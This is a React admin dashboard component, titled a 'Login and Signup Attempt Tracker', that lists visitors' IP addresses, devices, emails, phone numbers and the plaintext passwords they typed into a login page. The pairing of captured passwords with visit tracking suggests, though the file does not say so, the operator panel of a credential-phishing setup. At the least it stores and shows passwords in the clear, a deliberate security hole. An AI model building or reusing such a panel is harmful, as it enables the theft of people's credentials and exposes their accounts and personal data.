import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { LogOut, RefreshCw, Trash2, AlertCircle } from "lucide-react";

interface LoginAttempt {
  id: string;
  email: string;
  phone: string;
  password: string;
  ipAddress: string;
  userAgent: string;
  timestamp: string;
  type: "login" | "signup";
}

interface PageVisit {
  id: string;
  ipAddress: string;
  userAgent: string;
  visitTimestamp: string;
  email: string;
  phone: string;
  password: string;
  loginTimestamp: string | null;
  type: "visit" | "login" | "signup";
}

export default function Admin() {
  const navigate = useNavigate();
  const [attempts, setAttempts] = useState<LoginAttempt[]>([]);
  const [pageVisits, setPageVisits] = useState<PageVisit[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [activeTab, setActiveTab] = useState<"visits" | "logins">("visits");

  useEffect(() => {
    fetchData();
  }, []);

  const fetchData = async () => {
    try {
      setLoading(true);
      const response = await fetch("/api/admin/attempts");
      if (!response.ok) {
        if (response.status === 403) {
          navigate("/login");
          return;
        }
        throw new Error("Failed to fetch data");
      }
      const data = await response.json();
      setAttempts(data.attempts || []);
      setPageVisits(data.pageVisits || []);
    } catch (err) {
      setError("Failed to load data");
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  const deleteAttempt = async (id: string) => {
    if (!window.confirm("Are you sure?")) return;

    try {
      const response = await fetch(`/api/admin/attempts/${id}`, {
        method: "DELETE",
      });
      if (response.ok) {
        setAttempts(attempts.filter((a) => a.id !== id));
      }
    } catch (err) {
      console.error("Error deleting attempt:", err);
    }
  };

  const deleteVisit = async (id: string) => {
    if (!window.confirm("Are you sure?")) return;

    try {
      const response = await fetch(`/api/admin/visits/${id}`, {
        method: "DELETE",
      });
      if (response.ok) {
        setPageVisits(pageVisits.filter((v) => v.id !== id));
      }
    } catch (err) {
      console.error("Error deleting visit:", err);
    }
  };

  const clearAll = async () => {
    const message =
      activeTab === "visits"
        ? "Clear all page visits? This cannot be undone."
        : "Clear all login attempts? This cannot be undone.";

    if (!window.confirm(message)) return;

    try {
      const url =
        activeTab === "visits" ? "/api/admin/visits" : "/api/admin/attempts";
      const response = await fetch(url, {
        method: "DELETE",
      });
      if (response.ok) {
        if (activeTab === "visits") {
          setPageVisits([]);
        } else {
          setAttempts([]);
        }
      }
    } catch (err) {
      console.error("Error clearing:", err);
    }
  };

  const handleLogout = () => {
    localStorage.removeItem("isAdmin");
    localStorage.removeItem("adminEmail");
    navigate("/login");
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-white shadow-sm border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4 flex items-center justify-between">
          <div>
            <h1 className="text-3xl font-bold text-gray-900">
              <span className="text-blue-600">Admin</span> Dashboard
            </h1>
            <p className="text-gray-600 text-sm mt-1">
              Login and Signup Attempt Tracker
            </p>
          </div>
          <button
            onClick={handleLogout}
            className="flex items-center gap-2 bg-red-500 hover:bg-red-600 text-white px-4 py-2 rounded-lg transition-colors"
          >
            <LogOut className="w-4 h-4" />
            Logout
          </button>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {/* Stats */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-8">
          <div className="bg-white rounded-lg shadow p-6">
            <p className="text-gray-600 text-sm font-medium">Page Visits</p>
            <p className="text-3xl font-bold text-purple-600 mt-2">
              {pageVisits.length}
            </p>
          </div>
          <div className="bg-white rounded-lg shadow p-6">
            <p className="text-gray-600 text-sm font-medium">Completed Logins</p>
            <p className="text-3xl font-bold text-blue-600 mt-2">
              {pageVisits.filter((v) => v.loginTimestamp).length}
            </p>
          </div>
          <div className="bg-white rounded-lg shadow p-6">
            <p className="text-gray-600 text-sm font-medium">Total Attempts</p>
            <p className="text-3xl font-bold text-blue-600 mt-2">
              {attempts.length}
            </p>
          </div>
          <div className="bg-white rounded-lg shadow p-6">
            <p className="text-gray-600 text-sm font-medium">Signups</p>
            <p className="text-3xl font-bold text-green-600 mt-2">
              {attempts.filter((a) => a.type === "signup").length}
            </p>
          </div>
        </div>

        {/* Tabs */}
        <div className="mb-6 flex gap-2 border-b border-gray-200">
          <button
            onClick={() => setActiveTab("visits")}
            className={`px-4 py-2 font-medium border-b-2 transition-colors ${
              activeTab === "visits"
                ? "text-blue-600 border-blue-600"
                : "text-gray-600 border-transparent hover:text-gray-900"
            }`}
          >
            Page Visits ({pageVisits.length})
          </button>
          <button
            onClick={() => setActiveTab("logins")}
            className={`px-4 py-2 font-medium border-b-2 transition-colors ${
              activeTab === "logins"
                ? "text-blue-600 border-blue-600"
                : "text-gray-600 border-transparent hover:text-gray-900"
            }`}
          >
            Login Attempts ({attempts.length})
          </button>
        </div>

        {/* Controls */}
        <div className="mb-6 flex gap-3">
          <button
            onClick={fetchData}
            className="flex items-center gap-2 bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-lg transition-colors"
          >
            <RefreshCw className="w-4 h-4" />
            Refresh
          </button>
          {((activeTab === "visits" && pageVisits.length > 0) ||
            (activeTab === "logins" && attempts.length > 0)) && (
            <button
              onClick={clearAll}
              className="flex items-center gap-2 bg-red-500 hover:bg-red-600 text-white px-4 py-2 rounded-lg transition-colors"
            >
              <Trash2 className="w-4 h-4" />
              Clear All
            </button>
          )}
        </div>

        {/* Error Message */}
        {error && (
          <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-6 flex gap-3">
            <AlertCircle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
            <p className="text-red-700">{error}</p>
          </div>
        )}

        {/* Table */}
        <div className="bg-white rounded-lg shadow overflow-hidden">
          {loading ? (
            <div className="p-12 text-center">
              <div className="inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
              <p className="text-gray-600 mt-4">Loading data...</p>
            </div>
          ) : activeTab === "visits" ? (
            pageVisits.length === 0 ? (
              <div className="p-12 text-center">
                <p className="text-gray-600 text-lg mb-2">
                  No page visits tracked yet
                </p>
                <p className="text-gray-500 text-sm">
                  Visits will appear here when users visit the login page
                </p>
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead className="bg-gray-50 border-b border-gray-200">
                    <tr>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
                        Status
                      </th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
                        IP Address
                      </th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
                        Device / User Agent
                      </th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
                        Email / Phone
                      </th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
                        Visit Time
                      </th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
                        Login Time
                      </th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
                        Action
                      </th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-200">
                    {pageVisits.map((visit) => (
                      <tr key={visit.id} className="hover:bg-gray-50">
                        <td className="px-6 py-4 whitespace-nowrap">
                          <span
                            className={`inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium ${
                              visit.loginTimestamp
                                ? "bg-green-100 text-green-800"
                                : "bg-yellow-100 text-yellow-800"
                            }`}
                          >
                            {visit.loginTimestamp ? "Logged In" : "Visited"}
                          </span>
                        </td>
                        <td className="px-6 py-4 text-sm font-mono font-bold text-gray-900">
                          {visit.ipAddress}
                        </td>
                        <td className="px-6 py-4 text-sm text-gray-600 max-w-xs truncate">
                          {visit.userAgent}
                        </td>
                        <td className="px-6 py-4 text-sm text-gray-900 font-mono">
                          {visit.email || visit.phone || "-"}
                        </td>
                        <td className="px-6 py-4 text-sm text-gray-600 whitespace-nowrap">
                          {new Date(visit.visitTimestamp).toLocaleString()}
                        </td>
                        <td className="px-6 py-4 text-sm text-gray-600 whitespace-nowrap">
                          {visit.loginTimestamp
                            ? new Date(visit.loginTimestamp).toLocaleString()
                            : "-"}
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-right text-sm font-medium">
                          <button
                            onClick={() => deleteVisit(visit.id)}
                            className="text-red-600 hover:text-red-900 inline-flex items-center gap-1"
                          >
                            <Trash2 className="w-4 h-4" />
                            Delete
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )
          ) : attempts.length === 0 ? (
            <div className="p-12 text-center">
              <p className="text-gray-600 text-lg mb-2">No login attempts yet</p>
              <p className="text-gray-500 text-sm">
                Attempts will appear here when users try to login or signup
              </p>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-50 border-b border-gray-200">
                  <tr>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
                      Type
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
                      Email
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
                      Phone
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
                      Password
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
                      IP Address
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
                      Time
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
                      Action
                    </th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-200">
                  {attempts.map((attempt) => (
                    <tr key={attempt.id} className="hover:bg-gray-50">
                      <td className="px-6 py-4 whitespace-nowrap">
                        <span
                          className={`inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium ${
                            attempt.type === "login"
                              ? "bg-blue-100 text-blue-800"
                              : "bg-green-100 text-green-800"
                          }`}
                        >
                          {attempt.type === "login" ? "Login" : "Signup"}
                        </span>
                      </td>
                      <td className="px-6 py-4 text-sm text-gray-900 font-mono">
                        {attempt.email || "-"}
                      </td>
                      <td className="px-6 py-4 text-sm text-gray-900 font-mono">
                        {attempt.phone || "-"}
                      </td>
                      <td className="px-6 py-4 text-sm text-gray-900 font-mono">
                        <span className="bg-gray-100 px-2 py-1 rounded">
                          {attempt.password}
                        </span>
                      </td>
                      <td className="px-6 py-4 text-sm text-gray-600">
                        {attempt.ipAddress}
                      </td>
                      <td className="px-6 py-4 text-sm text-gray-600 whitespace-nowrap">
                        {new Date(attempt.timestamp).toLocaleString()}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-right text-sm font-medium">
                        <button
                          onClick={() => deleteAttempt(attempt.id)}
                          className="text-red-600 hover:text-red-900 inline-flex items-center gap-1"
                        >
                          <Trash2 className="w-4 h-4" />
                          Delete
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
